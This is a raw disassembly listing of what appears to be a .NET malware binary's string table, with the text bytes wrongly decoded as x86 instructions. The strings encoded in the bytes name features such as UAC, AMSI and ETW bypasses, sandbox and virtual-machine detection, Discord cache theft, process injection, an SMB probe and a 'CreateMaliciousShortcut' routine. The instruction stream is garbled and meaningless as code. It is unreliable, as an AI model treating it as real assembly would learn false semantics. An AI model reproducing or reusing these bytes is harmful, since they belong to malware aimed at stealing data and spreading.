  408b46:	72 67                	jb     0x408baf
  408b48:	73 00                	jae    0x408b4a
  408b4a:	54                   	push   %esp
  408b4b:	61                   	popa
  408b4c:	72 67                	jb     0x408bb5
  408b4e:	65 74 50             	gs je  0x408ba1
  408b51:	61                   	popa
  408b52:	74 68                	je     0x408bbc
  408b54:	73 00                	jae    0x408b56
  408b56:	3c 3e                	cmp    $0x3e,%al
  408b58:	34 5f                	xor    $0x5f,%al
  408b5a:	5f                   	pop    %edi
  408b5b:	74 68                	je     0x408bc5
  408b5d:	69 73 00 53 79 73 74 	imul   $0x74737953,0x0(%ebx),%esi
  408b64:	65 6d                	gs insl (%dx),%es:(%edi)
  408b66:	2e 54                	cs push %esp
  408b68:	68 72 65 61 64       	push   $0x64616572
  408b6d:	69 6e 67 2e 54 61 73 	imul   $0x7361542e,0x67(%esi),%ebp
  408b74:	6b 73 00 4d          	imul   $0x4d,0x0(%ebx),%esi
  408b78:	61                   	popa
  408b79:	78 43                	js     0x408bbe
  408b7b:	6f                   	outsl  %ds:(%esi),(%dx)
  408b7c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b7d:	63 75 72             	arpl   %esi,0x72(%ebp)
  408b80:	72 65                	jb     0x408be7
  408b82:	6e                   	outsb  %ds:(%esi),(%dx)
  408b83:	74 54                	je     0x408bd9
  408b85:	61                   	popa
  408b86:	73 6b                	jae    0x408bf3
  408b88:	73 00                	jae    0x408b8a
  408b8a:	45                   	inc    %ebp
  408b8b:	71 75                	jno    0x408c02
  408b8d:	61                   	popa
  408b8e:	6c                   	insb   (%dx),%es:(%edi)
  408b8f:	73 00                	jae    0x408b91
  408b91:	56                   	push   %esi
  408b92:	69 72 74 75 61 6c 4d 	imul   $0x4d6c6175,0x74(%edx),%esi
  408b99:	61                   	popa
  408b9a:	63 68 69             	arpl   %ebp,0x69(%eax)
  408b9d:	6e                   	outsb  %ds:(%esi),(%dx)
  408b9e:	65 73 4d             	gs jae 0x408bee
  408ba1:	6f                   	outsl  %ds:(%esi),(%dx)
  408ba2:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  408ba5:	73 00                	jae    0x408ba7
  408ba7:	44                   	inc    %esp
  408ba8:	6e                   	outsb  %ds:(%esi),(%dx)
  408ba9:	73 00                	jae    0x408bab
  408bab:	43                   	inc    %ebx
  408bac:	6f                   	outsl  %ds:(%esi),(%dx)
  408bad:	6e                   	outsb  %ds:(%esi),(%dx)
  408bae:	74 61                	je     0x408c11
  408bb0:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408bb7:	74 65                	je     0x408c1e
  408bb9:	6d                   	insl   (%dx),%es:(%edi)
  408bba:	2e 54                	cs push %esp
  408bbc:	65 78 74             	gs js  0x408c33
  408bbf:	2e 52                	cs push %edx
  408bc1:	65 67 75 6c          	gs addr16 jne 0x408c31
  408bc5:	61                   	popa
  408bc6:	72 45                	jb     0x408c0d
  408bc8:	78 70                	js     0x408c3a
  408bca:	72 65                	jb     0x408c31
  408bcc:	73 73                	jae    0x408c41
  408bce:	69 6f 6e 73 00 53 79 	imul   $0x79530073,0x6e(%edi),%ebp
  408bd5:	73 74                	jae    0x408c4b
  408bd7:	65 6d                	gs insl (%dx),%es:(%edi)
  408bd9:	2e 53                	cs push %ebx
  408bdb:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408bdf:	69 74 79 2e 50 65 72 	imul   $0x6d726550,0x2e(%ecx,%edi,2),%esi
  408be6:	6d 
  408be7:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  408bee:	00 49 6e             	add    %cl,0x6e(%ecx)
  408bf1:	76 6f                	jbe    0x408c62
  408bf3:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408bf7:	74 68                	je     0x408c61
  408bf9:	6f                   	outsl  %ds:(%esi),(%dx)
  408bfa:	64 4f                	fs dec %edi
  408bfc:	70 74                	jo     0x408c72
  408bfe:	69 6f 6e 73 00 43 6f 	imul   $0x6f430073,0x6e(%edi),%ebp
  408c05:	6e                   	outsb  %ds:(%esi),(%dx)
  408c06:	6e                   	outsb  %ds:(%esi),(%dx)
  408c07:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408c0c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c0d:	4f                   	dec    %edi
  408c0e:	70 74                	jo     0x408c84
  408c10:	69 6f 6e 73 00 4f 62 	imul   $0x624f0073,0x6e(%edi),%ebp
  408c17:	6a 65                	push   $0x65
  408c19:	63 74 47 65          	arpl   %esi,0x65(%edi,%eax,2)
  408c1d:	74 4f                	je     0x408c6e
  408c1f:	70 74                	jo     0x408c95
  408c21:	69 6f 6e 73 00 4d 61 	imul   $0x614d0073,0x6e(%edi),%ebp
  408c28:	6e                   	outsb  %ds:(%esi),(%dx)
  408c29:	61                   	popa
  408c2a:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c2d:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c2f:	74 4f                	je     0x408c80
  408c31:	70 74                	jo     0x408ca7
  408c33:	69 6f 6e 73 00 67 65 	imul   $0x65670073,0x6e(%edi),%ebp
  408c3a:	74 5f                	je     0x408c9b
  408c3c:	43                   	inc    %ebx
  408c3d:	68 61 72 73 00       	push   $0x737261
  408c42:	44                   	inc    %esp
  408c43:	69 73 63 6f 72 64 43 	imul   $0x4364726f,0x63(%ebx),%esi
  408c4a:	61                   	popa
  408c4b:	63 68 65             	arpl   %ebp,0x65(%eax)
  408c4e:	46                   	inc    %esi
  408c4f:	6f                   	outsl  %ds:(%esi),(%dx)
  408c50:	6c                   	insb   (%dx),%es:(%edi)
  408c51:	64 65 72 73          	fs gs jb 0x408cc8
  408c55:	00 70 6f             	add    %dh,0x6f(%eax)
  408c58:	73 73                	jae    0x408ccd
  408c5a:	69 62 6c 65 46 6f 6c 	imul   $0x6c6f4665,0x6c(%edx),%esp
  408c61:	64 65 72 73          	fs gs jb 0x408cd8
  408c65:	00 74 61 72          	add    %dh,0x72(%ecx,%eiz,2)
  408c69:	67 65 74 46          	addr16 gs je 0x408cb3
  408c6d:	6f                   	outsl  %ds:(%esi),(%dx)
  408c6e:	6c                   	insb   (%dx),%es:(%edi)
  408c6f:	64 65 72 73          	fs gs jb 0x408ce6
  408c73:	00 52 75             	add    %dl,0x75(%edx)
  408c76:	6e                   	outsb  %ds:(%esi),(%dx)
  408c77:	74 69                	je     0x408ce2
  408c79:	6d                   	insl   (%dx),%es:(%edi)
  408c7a:	65 48                	gs dec %eax
  408c7c:	65 6c                	gs insb (%dx),%es:(%edi)
  408c7e:	70 65                	jo     0x408ce5
  408c80:	72 73                	jb     0x408cf5
  408c82:	00 56 69             	add    %dl,0x69(%esi)
  408c85:	72 74                	jb     0x408cfb
  408c87:	75 61                	jne    0x408cea
  408c89:	6c                   	insb   (%dx),%es:(%edi)
  408c8a:	4d                   	dec    %ebp
  408c8b:	61                   	popa
  408c8c:	63 68 69             	arpl   %ebp,0x69(%eax)
  408c8f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c90:	65 73 4d             	gs jae 0x408ce0
  408c93:	61                   	popa
  408c94:	6e                   	outsb  %ds:(%esi),(%dx)
  408c95:	75 66                	jne    0x408cfd
  408c97:	61                   	popa
  408c98:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c9c:	65 72 73             	gs jb  0x408d12
  408c9f:	00 47 65             	add    %al,0x65(%edi)
  408ca2:	74 4d                	je     0x408cf1
  408ca4:	65 74 68             	gs je  0x408d0f
  408ca7:	6f                   	outsl  %ds:(%esi),(%dx)
  408ca8:	64 50                	fs push %eax
  408caa:	61                   	popa
  408cab:	72 61                	jb     0x408d0e
  408cad:	6d                   	insl   (%dx),%es:(%edi)
  408cae:	65 74 65             	gs je  0x408d16
  408cb1:	72 73                	jb     0x408d26
  408cb3:	00 53 61             	add    %dl,0x61(%ebx)
  408cb6:	6e                   	outsb  %ds:(%esi),(%dx)
  408cb7:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  408cbb:	49                   	dec    %ecx
  408cbc:	6e                   	outsb  %ds:(%esi),(%dx)
  408cbd:	64 69 63 61 74 6f 72 	imul   $0x73726f74,%fs:0x61(%ebx),%esp
  408cc4:	73 
  408cc5:	00 67 65             	add    %ah,0x65(%edi)
  408cc8:	74 5f                	je     0x408d29
  408cca:	54                   	push   %esp
  408ccb:	6f                   	outsl  %ds:(%esi),(%dx)
  408ccc:	74 61                	je     0x408d2f
  408cce:	6c                   	insb   (%dx),%es:(%edi)
  408ccf:	48                   	dec    %eax
  408cd0:	6f                   	outsl  %ds:(%esi),(%dx)
  408cd1:	75 72                	jne    0x408d45
  408cd3:	73 00                	jae    0x408cd5
  408cd5:	61                   	popa
  408cd6:	64 6d                	fs insl (%dx),%es:(%edi)
  408cd8:	69 6e 50 61 73 73 00 	imul   $0x737361,0x50(%esi),%ebp
  408cdf:	4d                   	dec    %ebp
  408ce0:	61                   	popa
  408ce1:	6e                   	outsb  %ds:(%esi),(%dx)
  408ce2:	61                   	popa
  408ce3:	67 65 6d             	gs insl (%dx),%es:(%di)
  408ce6:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ce8:	74 43                	je     0x408d2d
  408cea:	6c                   	insb   (%dx),%es:(%edi)
  408ceb:	61                   	popa
  408cec:	73 73                	jae    0x408d61
  408cee:	00 55 41             	add    %dl,0x41(%ebp)
  408cf1:	43                   	inc    %ebx
  408cf2:	42                   	inc    %edx
  408cf3:	79 70                	jns    0x408d65
  408cf5:	61                   	popa
  408cf6:	73 73                	jae    0x408d6b
  408cf8:	00 44 50 49          	add    %al,0x49(%eax,%edx,2)
  408cfc:	42                   	inc    %edx
  408cfd:	79 70                	jns    0x408d6f
  408cff:	61                   	popa
  408d00:	73 73                	jae    0x408d75
  408d02:	00 45 54             	add    %al,0x54(%ebp)
  408d05:	57                   	push   %edi
  408d06:	42                   	inc    %edx
  408d07:	79 70                	jns    0x408d79
  408d09:	61                   	popa
  408d0a:	73 73                	jae    0x408d7f
  408d0c:	00 41 6d             	add    %al,0x6d(%ecx)
  408d0f:	73 69                	jae    0x408d7a
  408d11:	42                   	inc    %edx
  408d12:	79 70                	jns    0x408d84
  408d14:	61                   	popa
  408d15:	73 73                	jae    0x408d8a
  408d17:	00 45 74             	add    %al,0x74(%ebp)
  408d1a:	77 42                	ja     0x408d5e
  408d1c:	79 70                	jns    0x408d8e
  408d1e:	61                   	popa
  408d1f:	73 73                	jae    0x408d94
  408d21:	00 70 72             	add    %dh,0x72(%eax)
  408d24:	6f                   	outsl  %ds:(%esi),(%dx)
  408d25:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d28:	73 41                	jae    0x408d6b
  408d2a:	63 63 65             	arpl   %esp,0x65(%ebx)
  408d2d:	73 73                	jae    0x408da2
  408d2f:	00 68 50             	add    %ch,0x50(%eax)
  408d32:	72 6f                	jb     0x408da3
  408d34:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d37:	73 00                	jae    0x408d39
  408d39:	43                   	inc    %ebx
  408d3a:	72 69                	jb     0x408da5
  408d3c:	74 69                	je     0x408da7
  408d3e:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408d41:	50                   	push   %eax
  408d42:	72 6f                	jb     0x408db3
  408d44:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d47:	73 00                	jae    0x408d49
  408d49:	4f                   	dec    %edi
  408d4a:	70 65                	jo     0x408db1
  408d4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408d4d:	50                   	push   %eax
  408d4e:	72 6f                	jb     0x408dbf
  408d50:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d53:	73 00                	jae    0x408d55
  408d55:	47                   	inc    %edi
  408d56:	65 74 43             	gs je  0x408d9c
  408d59:	75 72                	jne    0x408dcd
  408d5b:	72 65                	jb     0x408dc2
  408d5d:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5e:	74 50                	je     0x408db0
  408d60:	72 6f                	jb     0x408dd1
  408d62:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d65:	73 00                	jae    0x408d67
  408d67:	49                   	dec    %ecx
  408d68:	50                   	push   %eax
  408d69:	41                   	inc    %ecx
  408d6a:	64 64 72 65          	fs fs jb 0x408dd3
  408d6e:	73 73                	jae    0x408de3
  408d70:	00 48 61             	add    %cl,0x61(%eax)
  408d73:	73 53                	jae    0x408dc8
  408d75:	75 73                	jne    0x408dea
  408d77:	70 69                	jo     0x408de2
  408d79:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  408d7c:	75 73                	jne    0x408df1
  408d7e:	4d                   	dec    %ebp
  408d7f:	61                   	popa
  408d80:	63 41 64             	arpl   %eax,0x64(%ecx)
  408d83:	64 72 65             	fs jb  0x408deb
  408d86:	73 73                	jae    0x408dfb
  408d88:	00 47 65             	add    %al,0x65(%edi)
  408d8b:	74 50                	je     0x408ddd
  408d8d:	72 6f                	jb     0x408dfe
  408d8f:	63 41 64             	arpl   %eax,0x64(%ecx)
  408d92:	64 72 65             	fs jb  0x408dfa
  408d95:	73 73                	jae    0x408e0a
  408d97:	00 6c 70 42          	add    %ch,0x42(%eax,%esi,2)
  408d9b:	61                   	popa
  408d9c:	73 65                	jae    0x408e03
  408d9e:	41                   	inc    %ecx
  408d9f:	64 64 72 65          	fs fs jb 0x408e08
  408da3:	73 73                	jae    0x408e18
  408da5:	00 47 65             	add    %al,0x65(%edi)
  408da8:	74 50                	je     0x408dfa
  408daa:	68 79 73 69 63       	push   $0x63697379
  408daf:	61                   	popa
  408db0:	6c                   	insb   (%dx),%es:(%edi)
  408db1:	41                   	inc    %ecx
  408db2:	64 64 72 65          	fs fs jb 0x408e1b
  408db6:	73 73                	jae    0x408e2b
  408db8:	00 6c 70 41          	add    %ch,0x41(%eax,%esi,2)
  408dbc:	64 64 72 65          	fs fs jb 0x408e25
  408dc0:	73 73                	jae    0x408e35
  408dc2:	00 6c 70 53          	add    %ch,0x53(%eax,%esi,2)
  408dc6:	74 61                	je     0x408e29
  408dc8:	72 74                	jb     0x408e3e
  408dca:	41                   	inc    %ecx
  408dcb:	64 64 72 65          	fs fs jb 0x408e34
  408dcf:	73 73                	jae    0x408e44
  408dd1:	00 63 74             	add    %ah,0x74(%ebx)
  408dd4:	73 00                	jae    0x408dd6
  408dd6:	53                   	push   %ebx
  408dd7:	79 73                	jns    0x408e4c
  408dd9:	74 65                	je     0x408e40
  408ddb:	6d                   	insl   (%dx),%es:(%edi)
  408ddc:	2e 4e                	cs dec %esi
  408dde:	65 74 2e             	gs je  0x408e0f
  408de1:	53                   	push   %ebx
  408de2:	6f                   	outsl  %ds:(%esi),(%dx)
  408de3:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408de6:	74 73                	je     0x408e5b
  408de8:	00 73 65             	add    %dh,0x65(%ebx)
  408deb:	74 5f                	je     0x408e4c
  408ded:	41                   	inc    %ecx
  408dee:	72 67                	jb     0x408e57
  408df0:	75 6d                	jne    0x408e5f
  408df2:	65 6e                	outsb  %gs:(%esi),(%dx)
  408df4:	74 73                	je     0x408e69
  408df6:	00 45 78             	add    %al,0x78(%ebp)
  408df9:	69 73 74 73 00 49 50 	imul   $0x50490073,0x74(%ebx),%esi
  408e00:	53                   	push   %ebx
  408e01:	74 61                	je     0x408e64
  408e03:	74 75                	je     0x408e7a
  408e05:	73 00                	jae    0x408e07
  408e07:	67 65 74 5f          	addr16 gs je 0x408e6a
  408e0b:	53                   	push   %ebx
  408e0c:	74 61                	je     0x408e6f
  408e0e:	74 75                	je     0x408e85
  408e10:	73 00                	jae    0x408e12
  408e12:	43                   	inc    %ebx
  408e13:	6f                   	outsl  %ds:(%esi),(%dx)
  408e14:	6e                   	outsb  %ds:(%esi),(%dx)
  408e15:	63 61 74             	arpl   %esp,0x74(%ecx)
  408e18:	00 46 6f             	add    %al,0x6f(%esi)
  408e1b:	72 6d                	jb     0x408e8a
  408e1d:	61                   	popa
  408e1e:	74 00                	je     0x408e20
  408e20:	4d                   	dec    %ebp
  408e21:	61                   	popa
  408e22:	6e                   	outsb  %ds:(%esi),(%dx)
  408e23:	61                   	popa
  408e24:	67 65 6d             	gs insl (%dx),%es:(%di)
  408e27:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e29:	74 42                	je     0x408e6d
  408e2b:	61                   	popa
  408e2c:	73 65                	jae    0x408e93
  408e2e:	4f                   	dec    %edi
  408e2f:	62 6a 65             	bound  %ebp,0x65(%edx)
  408e32:	63 74 00 68          	arpl   %esi,0x68(%eax,%eax,1)
  408e36:	4f                   	dec    %edi
  408e37:	62 6a 65             	bound  %ebp,0x65(%edx)
  408e3a:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  408e3e:	61                   	popa
  408e3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408e40:	61                   	popa
  408e41:	67 65 6d             	gs insl (%dx),%es:(%di)
  408e44:	65 6e                	outsb  %gs:(%esi),(%dx)
  408e46:	74 4f                	je     0x408e97
  408e48:	62 6a 65             	bound  %ebp,0x65(%edx)
  408e4b:	63 74 00 49          	arpl   %esi,0x49(%eax,%eax,1)
  408e4f:	6e                   	outsb  %ds:(%esi),(%dx)
  408e50:	6a 65                	push   $0x65
  408e52:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  408e56:	65 6c                	gs insb (%dx),%es:(%edi)
  408e58:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  408e5d:	6f                   	outsl  %ds:(%esi),(%dx)
  408e5e:	6e                   	outsb  %ds:(%esi),(%dx)
  408e5f:	6e                   	outsb  %ds:(%esi),(%dx)
  408e60:	65 63 74 00 6c       	arpl   %esi,%gs:0x6c(%eax,%eax,1)
  408e65:	70 66                	jo     0x408ecd
  408e67:	6c                   	insb   (%dx),%es:(%edi)
  408e68:	4f                   	dec    %edi
  408e69:	6c                   	insb   (%dx),%es:(%edi)
  408e6a:	64 50                	fs push %eax
  408e6c:	72 6f                	jb     0x408edd
  408e6e:	74 65                	je     0x408ed5
  408e70:	63 74 00 56          	arpl   %esi,0x56(%eax,%eax,1)
  408e74:	69 72 74 75 61 6c 50 	imul   $0x506c6175,0x74(%edx),%esi
  408e7b:	72 6f                	jb     0x408eec
  408e7d:	74 65                	je     0x408ee4
  408e7f:	63 74 00 66          	arpl   %esi,0x66(%eax,%eax,1)
  408e83:	6c                   	insb   (%dx),%es:(%edi)
  408e84:	50                   	push   %eax
  408e85:	72 6f                	jb     0x408ef6
  408e87:	74 65                	je     0x408eee
  408e89:	63 74 00 66          	arpl   %esi,0x66(%eax,%eax,1)
  408e8d:	6c                   	insb   (%dx),%es:(%edi)
  408e8e:	4e                   	dec    %esi
  408e8f:	65 77 50             	gs ja  0x408ee2
  408e92:	72 6f                	jb     0x408f03
  408e94:	74 65                	je     0x408efb
  408e96:	63 74 00 47          	arpl   %esi,0x47(%eax,%eax,1)
  408e9a:	65 74 00             	gs je  0x408e9d
  408e9d:	53                   	push   %ebx
  408e9e:	79 73                	jns    0x408f13
  408ea0:	74 65                	je     0x408f07
  408ea2:	6d                   	insl   (%dx),%es:(%edi)
  408ea3:	2e 4e                	cs dec %esi
  408ea5:	65 74 00             	gs je  0x408ea8
  408ea8:	48                   	dec    %eax
  408ea9:	61                   	popa
  408eaa:	73 44                	jae    0x408ef0
  408eac:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408eb0:	52                   	push   %edx
  408eb1:	65 67 69 73 74 72 79 	imul   $0x65537972,%gs:0x74(%bp,%di),%esi
  408eb8:	53 65 
  408eba:	74 00                	je     0x408ebc
  408ebc:	73 6d                	jae    0x408f2b
  408ebe:	62 5f 70             	bound  %ebx,0x70(%edi)
  408ec1:	72 6f                	jb     0x408f32
  408ec3:	62 65 5f             	bound  %esp,0x5f(%ebp)
  408ec6:	70 61                	jo     0x408f29
  408ec8:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408ecb:	74 00                	je     0x408ecd
  408ecd:	53                   	push   %ebx
  408ece:	6f                   	outsl  %ds:(%esi),(%dx)
  408ecf:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408ed2:	74 00                	je     0x408ed4
  408ed4:	47                   	inc    %edi
  408ed5:	65 74 4c             	gs je  0x408f24
  408ed8:	6f                   	outsl  %ds:(%esi),(%dx)
  408ed9:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408edc:	53                   	push   %ebx
  408edd:	75 62                	jne    0x408f41
  408edf:	6e                   	outsb  %ds:(%esi),(%dx)
  408ee0:	65 74 00             	gs je  0x408ee3
  408ee3:	57                   	push   %edi
  408ee4:	61                   	popa
  408ee5:	69 74 00 6f 70 5f 45 	imul   $0x78455f70,0x6f(%eax,%eax,1),%esi
  408eec:	78 
  408eed:	70 6c                	jo     0x408f5b
  408eef:	69 63 69 74 00 53 70 	imul   $0x70530074,0x69(%ebx),%esp
  408ef6:	6c                   	insb   (%dx),%es:(%edi)
  408ef7:	69 74 00 57 61 69 74 	imul   $0x46746961,0x57(%eax,%eax,1),%esi
  408efe:	46 
  408eff:	6f                   	outsl  %ds:(%esi),(%dx)
  408f00:	72 45                	jb     0x408f47
  408f02:	78 69                	js     0x408f6d
  408f04:	74 00                	je     0x408f06
  408f06:	47                   	inc    %edi
  408f07:	65 74 52             	gs je  0x408f5c
  408f0a:	65 73 75             	gs jae 0x408f82
  408f0d:	6c                   	insb   (%dx),%es:(%edi)
  408f0e:	74 00                	je     0x408f10
  408f10:	53                   	push   %ebx
  408f11:	65 74 52             	gs je  0x408f66
  408f14:	65 73 75             	gs jae 0x408f8c
  408f17:	6c                   	insb   (%dx),%es:(%edi)
  408f18:	74 00                	je     0x408f1a
  408f1a:	46                   	inc    %esi
  408f1b:	69 6c 65 45 78 69 73 	imul   $0x74736978,0x45(%ebp,%eiz,2),%ebp
  408f22:	74 
  408f23:	73 41                	jae    0x408f66
  408f25:	6e                   	outsb  %ds:(%esi),(%dx)
  408f26:	64 52                	fs push %edx
  408f28:	65 63 65 6e          	arpl   %esp,%gs:0x6e(%ebp)
  408f2c:	74 00                	je     0x408f2e
  408f2e:	41                   	inc    %ecx
  408f2f:	63 63 65             	arpl   %esp,0x65(%ebx)
  408f32:	70 74                	jo     0x408fa8
  408f34:	54                   	push   %esp
  408f35:	63 70 43             	arpl   %esi,0x43(%eax)
  408f38:	6c                   	insb   (%dx),%es:(%edi)
  408f39:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  408f40:	73 74                	jae    0x408fb6
  408f42:	65 6d                	gs insl (%dx),%es:(%edi)
  408f44:	2e 4d                	cs dec %ebp
  408f46:	61                   	popa
  408f47:	6e                   	outsb  %ds:(%esi),(%dx)
  408f48:	61                   	popa
  408f49:	67 65 6d             	gs insl (%dx),%es:(%di)
  408f4c:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f4e:	74 00                	je     0x408f50
  408f50:	45                   	inc    %ebp
  408f51:	6e                   	outsb  %ds:(%esi),(%dx)
  408f52:	76 69                	jbe    0x408fbd
  408f54:	72 6f                	jb     0x408fc5
  408f56:	6e                   	outsb  %ds:(%esi),(%dx)
  408f57:	6d                   	insl   (%dx),%es:(%edi)
  408f58:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f5a:	74 00                	je     0x408f5c
  408f5c:	67 65 74 5f          	addr16 gs je 0x408fbf
  408f60:	43                   	inc    %ebx
  408f61:	75 72                	jne    0x408fd5
  408f63:	72 65                	jb     0x408fca
  408f65:	6e                   	outsb  %ds:(%esi),(%dx)
  408f66:	74 00                	je     0x408f68
  408f68:	47                   	inc    %edi
  408f69:	65 74 43             	gs je  0x408faf
  408f6c:	75 72                	jne    0x408fe0
  408f6e:	72 65                	jb     0x408fd5
  408f70:	6e                   	outsb  %ds:(%esi),(%dx)
  408f71:	74 00                	je     0x408f73
  408f73:	67 65 74 5f          	addr16 gs je 0x408fd6
  408f77:	50                   	push   %eax
  408f78:	72 6f                	jb     0x408fe9
  408f7a:	63 65 73             	arpl   %esp,0x73(%ebp)
  408f7d:	73 6f                	jae    0x408fee
  408f7f:	72 43                	jb     0x408fc4
  408f81:	6f                   	outsl  %ds:(%esi),(%dx)
  408f82:	75 6e                	jne    0x408ff2
  408f84:	74 00                	je     0x408f86
  408f86:	54                   	push   %esp
  408f87:	68 72 65 61 64       	push   $0x64616572
  408f8c:	53                   	push   %ebx
  408f8d:	74 61                	je     0x408ff0
  408f8f:	72 74                	jb     0x409005
  408f91:	00 43 6f             	add    %al,0x6f(%ebx)
  408f94:	6e                   	outsb  %ds:(%esi),(%dx)
  408f95:	76 65                	jbe    0x408ffc
  408f97:	72 74                	jb     0x40900d
  408f99:	00 52 65             	add    %dl,0x65(%edx)
  408f9c:	6d                   	insl   (%dx),%es:(%edi)
  408f9d:	6f                   	outsl  %ds:(%esi),(%dx)
  408f9e:	74 65                	je     0x409005
  408fa0:	45                   	inc    %ebp
  408fa1:	78 65                	js     0x409008
  408fa3:	63 50 6f             	arpl   %edx,0x6f(%eax)
  408fa6:	72 74                	jb     0x40901c
  408fa8:	00 70 6f             	add    %dh,0x6f(%eax)
  408fab:	72 74                	jb     0x409021
  408fad:	00 67 65             	add    %ah,0x65(%edi)
  408fb0:	74 5f                	je     0x409011
  408fb2:	52                   	push   %edx
  408fb3:	65 71 75             	gs jno 0x40902b
  408fb6:	65 73 74             	gs jae 0x40902d
  408fb9:	00 48 74             	add    %cl,0x74(%eax)
  408fbc:	74 70                	je     0x40902e
  408fbe:	4c                   	dec    %esp
  408fbf:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  408fc6:	52                   	push   %edx
  408fc7:	65 71 75             	gs jno 0x40903f
  408fca:	65 73 74             	gs jae 0x409041
  408fcd:	00 67 65             	add    %ah,0x65(%edi)
  408fd0:	74 5f                	je     0x409031
  408fd2:	41                   	inc    %ecx
  408fd3:	64 64 72 65          	fs fs jb 0x40903c
  408fd7:	73 73                	jae    0x40904c
  408fd9:	4c                   	dec    %esp
  408fda:	69 73 74 00 68 6f 73 	imul   $0x736f6800,0x74(%ebx),%esi
  408fe1:	74 00                	je     0x408fe3
  408fe3:	50                   	push   %eax
  408fe4:	75 74                	jne    0x40905a
  408fe6:	00 43 72             	add    %al,0x72(%ebx)
  408fe9:	65 61                	gs popa
  408feb:	74 65                	je     0x409052
  408fed:	53                   	push   %ebx
  408fee:	68 6f 72 74 63       	push   $0x6374726f
  408ff3:	75 74                	jne    0x409069
  408ff5:	00 43 72             	add    %al,0x72(%ebx)
  408ff8:	65 61                	gs popa
  408ffa:	74 65                	je     0x409061
  408ffc:	4d                   	dec    %ebp
  408ffd:	61                   	popa
  408ffe:	6c                   	insb   (%dx),%es:(%edi)
  408fff:	69 63 69 6f 75 73 53 	imul   $0x5373756f,0x69(%ebx),%esp
  409006:	68 6f 72 74 63       	push   $0x6374726f
  40900b:	75 74                	jne    0x409081
  40900d:	00 73 65             	add    %dh,0x65(%ebx)
  409010:	74 5f                	je     0x409071
  409012:	54                   	push   %esp
  409013:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40901a:	73 65                	jae    0x409081
  40901c:	74 5f                	je     0x40907d
  40901e:	53                   	push   %ebx
  40901f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409021:	64 54                	fs push %esp
  409023:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40902a:	73 65                	jae    0x409091
  40902c:	74 5f                	je     0x40908d
  40902e:	52                   	push   %edx
  40902f:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  409033:	76 65                	jbe    0x40909a
  409035:	54                   	push   %esp
  409036:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40903d:	74 69                	je     0x4090a8
  40903f:	6d                   	insl   (%dx),%es:(%edi)
  409040:	65 6f                	outsl  %gs:(%esi),(%dx)
  409042:	75 74                	jne    0x4090b8
  409044:	00 67 65             	add    %ah,0x65(%edi)
  409047:	74 5f                	je     0x4090a8
  409049:	53                   	push   %ebx
  40904a:	74 61                	je     0x4090ad
  40904c:	6e                   	outsb  %ds:(%esi),(%dx)
  40904d:	64 61                	fs popa
  40904f:	72 64                	jb     0x4090b5
  409051:	4f                   	dec    %edi
  409052:	75 74                	jne    0x4090c8
  409054:	70 75                	jo     0x4090cb
  409056:	74 00                	je     0x409058
  409058:	73 65                	jae    0x4090bf
  40905a:	74 5f                	je     0x4090bb
  40905c:	52                   	push   %edx
  40905d:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  409064:	53 74 
  409066:	61                   	popa
  409067:	6e                   	outsb  %ds:(%esi),(%dx)
  409068:	64 61                	fs popa
  40906a:	72 64                	jb     0x4090d0
  40906c:	4f                   	dec    %edi
  40906d:	75 74                	jne    0x4090e3
  40906f:	70 75                	jo     0x4090e6
  409071:	74 00                	je     0x409073
  409073:	4d                   	dec    %ebp
  409074:	6f                   	outsl  %ds:(%esi),(%dx)
  409075:	76 65                	jbe    0x4090dc
  409077:	4e                   	dec    %esi
  409078:	65 78 74             	gs js  0x4090ef
  40907b:	00 53 79             	add    %dl,0x79(%ebx)
  40907e:	73 74                	jae    0x4090f4
  409080:	65 6d                	gs insl (%dx),%es:(%edi)
  409082:	2e 54                	cs push %esp
  409084:	65 78 74             	gs js  0x4090fb
  409087:	00 57 72             	add    %dl,0x72(%edi)
  40908a:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  409091:	65 
  409092:	78 74                	js     0x409108
